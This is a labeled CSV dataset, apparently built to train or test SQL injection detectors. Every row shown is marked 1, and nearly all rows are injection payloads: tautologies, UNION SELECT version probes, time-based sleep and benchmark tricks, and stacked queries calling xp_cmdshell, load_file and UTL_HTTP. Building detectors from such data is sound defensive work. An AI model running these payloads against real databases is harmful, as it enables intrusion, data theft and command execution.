Data,Label
"s,os: select * from users where id = 1 or "",&"" or 1 = 1 -- 1",1
"s,{s: select * from users where id = 1 or "",{"" or 1 = 1 -- 1",1
"s. ( s: select * from users where id = 1 or "". ( "" or 1 = 1 -- 1",1
"s. ) s: select * from users where id = 1 or "". ) "" or 1 = 1 -- 1",1
"s.,s: select * from users where id = 1 or "".,"" or 1 = 1 -- 1",1
"s..s: select * from users where id = 1 or "".."" = 1 or 1 = 1 -- 1",1
"s.:s: select * from users where id = 1 or "".:"" = 1 or 1 = 1 -- 1",1
"s.;s: select * from users where id = 1 or "".;"" or 1 = 1 -- 1",1
"s.?s: select * from users where id = 1 or "".]"" or 1 = 1 -- 1",1
"s.UE1: select * from users where id = 1 or 1#"". union select 1,version (  )  -- 1",1
"s.UEf: select * from users where id = 1 or 1#"". union select version (  ) ,version (  )  -- 1",1
"s.UEs: select * from users where id = 1 or 1#"". union select 'a',version (  )  -- 1",1
"s.UEv: select * from users where id = 1 or 1#"". union select null,version (  )  -- 1",1
"s.c: select * from users where id = 1 or "".#"" or 1 = 1 -- 1",1
"s.n: select * from users where id = 1 or "".["" or 1 = 1 -- 1",1
"s.ns: select * from users where id = 1 or ""._"" or 1 = 1 -- 1",1
"s.o1&: select * from users where id = 1 or @#"". = 1 or 1 = 1 -- 1",1
"s.o1U: select * from users where id = 1 or 1#"". = 1 union select 1,version (  )  -- 1",1
"s.os: select * from users where id = 1 or "".%"" or 1 = 1 -- 1",1
"s.v: select * from users where id = 1 or "".@"" or 1 = 1 -- 1",1
"s.{s: select * from users where id = 1 or "".{"" or 1 = 1 -- 1",1
"s1 ( s: select * from users where id = 1 or ""1 ( "" = 1 or 1 = 1 -- 1",1
"s1 ) s: select * from users where id = 1 or ""1 ) "" or 1 = 1 -- 1",1
"s1: select * from users where id = 1 or ""1,"" or 1 = 1 -- 1",1
"s1:s: select * from users where id = 1 or ""1:"" or 1 = 1 -- 1",1
"s1;s: select * from users where id = 1 or ""1;"" = 1 or 1 = 1 -- 1",1
"s1?s: select * from users where id = 1 or ""1]"" or 1 = 1 -- 1",1
"s1UE1: select * from users where id = 1 or 1#""1 union select 1,version (  )  -- 1",1
"s1UEf: select * from users where id = 1 or 1#""1 union select version (  ) ,version (  )  -- 1",1
"s1UEs: select * from users where id = 1 or 1#""1 union select 'a',version (  )  -- 1",1
"s1UEv: select * from users where id = 1 or 1#""1 union select null,version (  )  -- 1",1
"s1c: select * from users where id = 1 or ""1#"" or 1 = 1 -- 1",1
"s1n: select * from users where id = 1 or ""1["" or 1 = 1 -- 1",1
"s1ns: select * from users where id = 1 or ""1_"" or 1 = 1 -- 1",1
"s1os: select * from users where id = 1 or ""1&"" or 1 = 1 -- 1",1
"s1{s: select * from users where id = 1 or ""1{"" or 1 = 1 -- 1",1
"s: select * from users where id = '1' or """"<@ union select 1,version (  )  -- 1'",1
"s:&1c: select * from users where id = 1 or 1#"": or 1 = 1 -- 1",1
"s: ( s: select * from users where id = 1 or "": ( "" = 1 or 1 = 1 -- 1",1
"s: ) s: select * from users where id = 1 or "": ) "" = 1 or 1 = 1 -- 1",1
"s:,s: select * from users where id = 1 or "":,"" or 1 = 1 -- 1",1
"s:.s: select * from users where id = 1 or "":."" = 1 or 1 = 1 -- 1",1
"s:1s: select * from users where id = 1 or "":1"" or 1 = 1 -- 1",1
"s:;s: select * from users where id = 1 or "":;"" = 1 or 1 = 1 -- 1",1
"s:?s: select * from users where id = 1 or "":]"" or 1 = 1 -- 1",1
"s:UE1: select * from users where id = 1 or 1#"": union select 1,version (  )  -- 1",1
"s:UEf: select * from users where id = 1 or 1#"": union select version (  ) ,version (  )  -- 1",1
"s:UEs: select * from users where id = 1 or 1#"": union select 'a',version (  )  -- 1",1
"s:UEv: select * from users where id = 1 or 1#"": union select null,version (  )  -- 1",1
"s:c: select * from users where id = 1 or "":#"" or 1 = 1 -- 1",1
"s:n: select * from users where id = 1 or "":["" or 1 = 1 -- 1",1
"s:ns: select * from users where id = 1 or "":$"" or 1 = 1 -- 1",1
"s:os: select * from users where id = 1 or "":%"" or 1 = 1 -- 1",1
"s:s: select * from users where id = '1' union select "":""_,version (  )  -- 1'",1
"s:v: select * from users where id = 1 or "":@"" or 1 = 1 -- 1",1
"s:{s: select * from users where id = 1 or "":{"" or 1 = 1 -- 1",1
"s;&1c: select * from users where id = 1 or 1#""; or 1 = 1 -- 1",1
"s; ( s: select * from users where id = 1 or ""; ( "" or 1 = 1 -- 1",1
"s; ) s: select * from users where id = 1 or ""; ) "" = 1 or 1 = 1 -- 1",1
"s;,s: select * from users where id = 1 or "";,"" = 1 or 1 = 1 -- 1",1
"s;.s: select * from users where id = 1 or "";."" = 1 or 1 = 1 -- 1",1
"s;1s: select * from users where id = 1 or "";1"" or 1 = 1 -- 1",1
"s;:s: select * from users where id = 1 or "";:"" = 1 or 1 = 1 -- 1",1
"s;?s: select * from users where id = 1 or "";]"" or 1 = 1 -- 1",1
"s;UE1: select * from users where id = 1 or 1#""; union select 1,version (  )  -- 1",1
"s;UEf: select * from users where id = 1 or 1#""; union select version (  ) ,version (  )  -- 1",1
"s;UEs: select * from users where id = 1 or 1#""; union select 'a',version (  )  -- 1",1
"s;UEv: select * from users where id = 1 or 1#""; union select null,version (  )  -- 1",1
"s;c: select * from users where id = 1 or "";#"" or 1 = 1 -- 1",1
"s;n: select * from users where id = 1 or "";["" or 1 = 1 -- 1",1
"s;ns: select * from users where id = 1 or "";_"" or 1 = 1 -- 1",1
"s;o1&: select * from users where id = 1 or @#""; = 1 or 1 = 1 -- 1",1
"s;o1U: select * from users where id = 1 or 1#""; = 1 union select 1,version (  )  -- 1",1
"s;os: select * from users where id = 1 or "";&"" or 1 = 1 -- 1",1
"s;s: select * from users where id = '1' union select "";""_,version (  )  -- 1'",1
"s;v: select * from users where id = 1 or "";@"" or 1 = 1 -- 1",1
"s;{s: select * from users where id = 1 or "";{"" or 1 = 1 -- 1",1
"s?&1c: select * from users where id = 1 or 1#""? or 1 = 1 -- 1",1
"s? ( s: select * from users where id = 1 or ""? ( "" or 1 = 1 -- 1",1
"s? ) s: select * from users where id = 1 or ""] ) "" or 1 = 1 -- 1",1
"s?,s: select * from users where id = 1 or ""?,"" or 1 = 1 -- 1",1
"s?,vc: select * from users where id = '1' union select $[""],@@VERSION -- 1'",1
"s?.s: select * from users where id = 1 or ""]."" or 1 = 1 -- 1",1
"s?1s: select * from users where id = 1 or ""]1"" or 1 = 1 -- 1",1
"s?:s: select * from users where id = 1 or ""]:"" or 1 = 1 -- 1",1
"s?;s: select * from users where id = 1 or ""?;"" or 1 = 1 -- 1",1
"s??s: select * from users where id = 1 or ""??"" or 1 = 1 -- 1",1
"s?UE1: select * from users where id = 1 or 1#""? union select 1,version (  )  -- 1",1
"s?UEf: select * from users where id = 1 or 1#""? union select version (  ) ,version (  )  -- 1",1
"s?UEs: select * from users where id = 1 or 1#""? union select 'a',version (  )  -- 1",1
"s?UEv: select * from users where id = 1 or 1#""? union select null,version (  )  -- 1",1
"s?c: select * from users where id = 1 or ""?#"" or 1 = 1 -- 1",1
"s?n: select * from users where id = 1 or ""?["" or 1 = 1 -- 1",1
"s?ns: select * from users where id = 1 or ""?_"" or 1 = 1 -- 1",1
"s?o1&: select * from users where id = 1 or 1#""? = 1 or 1 = 1 -- 1",1
"s?o1U: select * from users where id = 1 or 1#""? = 1 union select 1,version (  )  -- 1",1
"s?os: select * from users where id = 1 or ""?%"" or 1 = 1 -- 1",1
"s?s: select * from users where id = '1' union select ""?""_,version (  )  -- 1'",1
"s?v: select * from users where id = 1 or ""?@"" or 1 = 1 -- 1",1
"s?{s: select * from users where id = 1 or ""]{"" or 1 = 1 -- 1",1
"sUE&o: select * from users where id = '1' union select ||/1,version (  )  -- 1'",1
"sUE (  ) : select * from users where id = '1' union select  ( \ ) ,@@VERSION -- 1'",1
"sUE ( .: select * from users where id = '1' union select  ( \. ) ,@@VERSION -- 1'",1
"sUE ( 1: select * from users where id = '1' union select  ( 1 ) ,banner from v$version where rownum = 1 -- 1'",1
"sUE,v: select * from users where id = '1' union select \,@@VERSION -- 1'",1
"sUE.,: select * from users where id = '1' union select \.,@@VERSION -- 1'",1
"sUE.c: select * from users where id = '1' union select \.#,@@VERSION -- 1'",1
"sUE.o: select * from users where id = '1' union select \.%1,@@VERSION -- 1'",1
"sUE1k: select * from users where id = '1' union select 1,banner from v$version where rownum = 1 -- 1'",1
"sUE1n: select * from users where id = '1' union select 1a,banner from v$version where rownum = 1 -- 1'",1
"sUE1s: select * from users where id = '1' union select 1""!"",banner from v$version where rownum = 1 -- 1'",1
"sUE\c: select * from users where id = '1' union select \#,@@VERSION -- 1'",1
"sUEn.: select * from users where id = '1' union select $ .,@@VERSION -- 1'",1
"sUEnn: select * from users where id = '1' union select $ _,@@VERSION -- 1'",1
"sUEnv: select * from users where id = '1' union select $*$,@@VERSION -- 1'",1
"sUEo,: select * from users where id = '1' union select +\,@@VERSION -- 1'",1
"sUEo.: select * from users where id = '1' union select +\.,@@VERSION -- 1'",1
"sUEo1: select * from users where id = '1' union select !<1,version (  )  -- 1'",1
"sUEo\: select * from users where id = '1' union select +\#,@@VERSION -- 1'",1
"sUEov: select * from users where id = '1' union select !<@,version (  )  -- 1'",1
"sUEv1: select * from users where id = '1' union select @ 1,version (  )  --  1'",1
"sUEvk: select * from users where id = '1'   union select null,banner from v$version where rownum = 1 -- 1'",1
"sUEvv: select * from users where id = '1' union select @ @1,version (  )  --  1'",1
"s\c: select * from users where id = 1 or ""\#"" or 1 = 1 -- 1",1
"sn ( s: select * from users where id = 1 or ""$ ( "" or 1 = 1 -- 1",1
"sn ) s: select * from users where id = 1 or ""_ ) "" or 1 = 1 -- 1",1
"sn: select * from users where id = '1' union select ""[""_,version (  )  -- 1'",1
"sn:s: select * from users where id = 1 or ""$:"" or 1 = 1 -- 1",1
"sn;s: select * from users where id = 1 or ""_;"" or 1 = 1 -- 1",1
"sn?s: select * from users where id = 1 or ""$?"" or 1 = 1 -- 1",1
"snUE1: select * from users where id = 1 or 1#""$ union select 1,version (  )  -- 1",1
"snUEf: select * from users where id = 1 or 1#""$ union select version (  ) ,version (  )  -- 1",1
"snUEs: select * from users where id = 1 or 1#""$ union select 'a',version (  )  -- 1",1
"snUEv: select * from users where id = 1 or 1#""$ union select null,version (  )  -- 1",1
"snc: select * from users where id = 1 or ""$#"" or 1 = 1 -- 1",1
"snn: select * from users where id = 1 or ""$["" or 1 = 1 -- 1",1
"snns: select * from users where id = 1 or ""$_"" or 1 = 1 -- 1",1
"snos: select * from users where id = 1 or ""$&"" or 1 = 1 -- 1",1
"snv: select * from users where id = 1 or ""$@"" or 1 = 1 -- 1",1
"sn{s: select * from users where id = 1 or ""_{"" or 1 = 1 -- 1",1
so (  ) &: select * from users where id = '1' * ( \ )  or 1 = 1 -- 1',1
"so (  ) U: select * from users where id = '1' +  ( \ )  union select 1,@@VERSION -- 1'",1
"so ( . ) : select * from users where id = '1' +  ( \. )  union select 1,@@VERSION -- 1'",1
"so ( 1 ) : select * from users where id = '1' * ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1'",1
"so ( s: select * from users where id = 1 or ""& ( "" or 1 = 1 -- 1",1
"so ) s: select * from users where id = 1 or ""& ) "" or 1 = 1 -- 1",1
"so,s: select * from users where id = 1 or ""%,"" or 1 = 1 -- 1",1
so..&: select * from users where id = '1'<@.. or 1 = 1 -- 1',1
"so..U: select * from users where id = '1'<@.. union select 1,version (  )  -- 1'",1
so.n&: select * from users where id = '1' <@.$ or 1 = 1 -- 1',1
"so.nU: select * from users where id = '1' <@._ union select 1,version (  )  -- 1'",1
"so.s: select * from users where id = 1 or ""%."" or 1 = 1 -- 1",1
"so1&1: select * from users where id = '1' + 1||1 union select 1,banner from v$version where rownum = 1 -- 1'",1
"so1UE: select * from users where id = '1' *1 union select 1,banner from v$version where rownum = 1 -- 1'",1
"so1s: select * from users where id = 1 or ""%1"" or 1 = 1 -- 1",1
"so:s: select * from users where id = 1 or ""&:"" or 1 = 1 -- 1",1
"so;s: select * from users where id = 1 or ""%;"" or 1 = 1 -- 1",1
"so?s: select * from users where id = 1 or ""%?"" or 1 = 1 -- 1",1
"soc: select * from users where id = '1' + @<@# union select 1,version (  )  -- 1'",1
son.&: select * from users where id = '1' *$ . or 1 = 1 -- 1',1
"son.U: select * from users where id = '1' + $ . union select 1,@@VERSION -- 1'",1
son1&: select * from users where id = '1' *$ 1 or 1 = 1 -- 1',1
"son: select * from users where id = 1 or ""%["" or 1 = 1 -- 1",1
sonn&: select * from users where id = '1' <@$_ or 1 = 1 -- 1',1
"sonnU: select * from users where id = '1' <@$_ union select 1,version (  )  -- 1'",1
"sons: select * from users where id = 1 or ""%_"" or 1 = 1 -- 1",1
soo&1: select * from users where id = '1' + $+%\ or 1 = 1 -- 1',1
soo1&: select * from users where id = '1' <@&1 or 1 = 1 -- 1',1
"soo1U: select * from users where id = '1' <@&1 union select 1,version (  )  -- 1'",1
"sooUE: select * from users where id = '1' <@<@ union select 1,version (  )  -- 1'",1
soon&: select * from users where id = '1' + $+%$ or 1 = 1 -- 1',1
"soonU: select * from users where id = '1' + $+*$ union select 1,@@VERSION -- 1'",1
"soos: select * from users where id = 1 or ""%&"" or 1 = 1 -- 1",1
soov&: select * from users where id = '1' <@&@ or 1 = 1 -- 1',1
"soovU: select * from users where id = '1' %!<@ union select 1,version (  )  -- 1'",1
"sos: select * from users where id = '1'<@$$ union select 1,version (  )  -- 1'",1
"sov ( 1: select * from users where id = '1' + @ ( 1 )  union select 1,version (  )  -- 1'",1
"sov1U: select * from users where id = '1' + @ 1 union select 1,version (  )  -- 1'",1
"sov1o: select * from users where id = '1' + @ 1! union select 1,version (  )  -- 1'",1
"sovvU: select * from users where id = '1' + @ @1 union select 1,version (  )  -- 1'",1
"so{s: select * from users where id = 1 or ""%{"" or 1 = 1 -- 1",1
"sv ( s: select * from users where id = 1 or ""@ ( "" or 1 = 1 -- 1",1
"sv ) s: select * from users where id = 1 or ""@ ) "" or 1 = 1 -- 1",1
"sv:s: select * from users where id = 1 or ""@:"" = 1 or 1 = 1 -- 1",1
"sv;s: select * from users where id = 1 or ""@;"" = 1 or 1 = 1 -- 1",1
"sv?s: select * from users where id = 1 or ""@?"" or 1 = 1 -- 1",1
"svUE1: select * from users where id = 1 or 1#""@ union select 1,version (  )  -- 1",1
"svUEf: select * from users where id = 1 or 1#""@ union select version (  ) ,version (  )  -- 1",1
"svUEs: select * from users where id = 1 or 1#""@ union select 'a',version (  )  -- 1",1
"svUEv: select * from users where id = 1 or 1#""@ union select null,version (  )  -- 1",1
"svc: select * from users where id = 1 or ""@#"" or 1 = 1 -- 1",1
"svos: select * from users where id = 1 or ""@%"" or 1 = 1 -- 1",1
"s{ ( s: select * from users where id = 1 or ""{ ( "" = 1 or 1 = 1 -- 1",1
"s{ ) s: select * from users where id = 1 or ""{ ) "" or 1 = 1 -- 1",1
"s{,s: select * from users where id = 1 or ""{,"" = 1 or 1 = 1 -- 1",1
"s{.s: select * from users where id = 1 or ""{."" or 1 = 1 -- 1",1
"s{1s: select * from users where id = 1 or ""{1"" = 1 or 1 = 1 -- 1",1
"s{:s: select * from users where id = 1 or ""{:"" or 1 = 1 -- 1",1
"s{;s: select * from users where id = 1 or ""{;"" or 1 = 1 -- 1",1
"s{?s: select * from users where id = 1 or ""{?"" or 1 = 1 -- 1",1
"s{UE1: select * from users where id = 1 or 1#""{ union select 1,version (  )  -- 1",1
"s{UEf: select * from users where id = 1 or 1#""{ union select version (  ) ,version (  )  -- 1",1
"s{UEs: select * from users where id = 1 or 1#""{ union select 'a',version (  )  -- 1",1
"s{UEv: select * from users where id = 1 or 1#""{ union select null,version (  )  -- 1",1
"s{c: select * from users where id = 1 or ""{#"" or 1 = 1 -- 1",1
"s{o1&: select * from users where id = 1 or @#""{ = 1 or 1 = 1 -- 1",1
"s{o1U: select * from users where id = 1 or @#""{ = 1 union select 1,version (  )  -- 1",1
"s{os: select * from users where id = 1 or ""{%"" or 1 = 1 -- 1",1
"s{v: select * from users where id = 1 or ""{@"" or 1 = 1 -- 1",1
"s{{s: select * from users where id = 1 or ""{{"" or 1 = 1 -- 1",1
"v: select * from users where id = 1 + @`\` union select 1,version (  )  -- 1",1
"vc: select * from users where id = 1 + @<1# union select 1,version (  )  -- 1",1
"vo.UE: select * from users where id = 1 + @<@. union select 1,version (  )  -- 1",1
"voUE1: select * from users where id = 1 -@<@ union select 1,version (  )  -- 1",1
"voUEf: select * from users where id = 1 -@<@ union select version (  ) ,version (  )  -- 1",1
"voUEv: select * from users where id = 1 -@<@ union select null,version (  )  -- 1",1
"voc: select * from users where id = 1 + @<@# union select null,version (  )  -- 1",1
 )  or  ( 'x' = 'x,1
 or 1 = 1,1
; execute immediate 'sel' || 'ect us' || 'er',1
"benchmark ( 10000000,MD5 ( 1  )  )  #",1
update,1
""";waitfor delay '0:0:__TIME__'--",1
1 )  or pg_sleep ( __TIME__ ) --,1
"|| ( elt ( -3+5,bin ( 15 ) ,ord ( 10 ) ,hex ( char ( 45  )  )    )  )  ",1
delete,1
like,1
""" or sleep ( __TIME__ ) #",1
pg_sleep ( __TIME__ ) --,1
declare @q nvarchar  ( 200 )  0x730065006c00650063 ...,1
 or 0 = 0 #,1
insert,1
1 )  or sleep ( __TIME__ ) #,1
 )  or  ( 'a' = 'a,1
; exec xp_regread,1
@var select @var as var into temp end --,1
"1  )  )   or benchmark ( 10000000,MD5 ( 1  )  )  #",1
asc,1
 ( ||6 ) ,1
""" or benchmark ( 10000000,MD5 ( 1  )  )  #",1
# from wapiti,1
 or 0 = 0 --,1
1 waitfor delay '0:0:10'--,1
 or 'a' = 'a,1
or a  =  a,1
 UNION ALL SELECT,1
 )  or sleep ( __TIME__ )  = ',1
"  )  )   or benchmark ( 10000000,MD5 ( 1  )  )  #",1
0,1
21 %,1
limit,1
 or 2 > 1,1
"""  )  )   or benchmark ( 10000000,MD5 ( 1  )  )  #",1
PRINT,1
 or 3 = 3,1
  )  )  ;waitfor delay '0:0:__TIME__'--,1
a' waitfor delay '0:0:10'--,1
"1; ( load_file ( char ( 47,101,116,99,47,112,97,115, ...",1
1 or sleep ( __TIME__ ) #,1
 and 1 in  ( select var from temp ) --,1
 or '7659' = '7659,1
 or 'text'  =  n'text',1
 --,1
 or 1 = 1 or '' = ',1
declare @s varchar  ( 200 )  select @s  =  0x73656c6 ...,1
exec xp,1
; exec master..xp_cmdshell 'ping 172.10.1.255'--,1
3.10E+17,1
""" or pg_sleep ( __TIME__ ) --",1
admin' or ',1
 or 'unusual'  =  'unusual',1
truncate,1
"1 )  or benchmark ( 10000000,MD5 ( 1  )  )  #",1
declare @s varchar ( 200 )  select @s  =  0x77616974 ...,1
sqlvuln,1
"""  )  )  ;waitfor delay '0:0:__TIME__'--",1
||6,1
or a = a,1
 )  union select * from information_schema.tables;,1
PRINT @@variable,1
or isNULL ( 1/0 )  /*,1
26 %,1
""" or ""a"" = ""a",1
 or 1 = 1--,1
" and 1 =  (  if  (  (  load_file ( char ( 110,46,101,120,11 ...",1
0x770061006900740066006F0072002000640065006C00 ...,1
as,1
1  )  )   or pg_sleep ( __TIME__ ) --,1
/**/or/**/1/**/ = /**/1,1
 union all select @@version--,1
",@variable",1
 ( sqlattempt2 ) ,1
 or  ( EXISTS ) ,1
t'exec master..xp_cmdshell 'nslookup www.googl ...,1
"1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
 or '' = ',1
||UTL_HTTP.REQUEST,1
 or pg_sleep ( __TIME__ ) --,1
hi' or 'x' = 'x';,1
""" )  or sleep ( __TIME__ )  = """,1
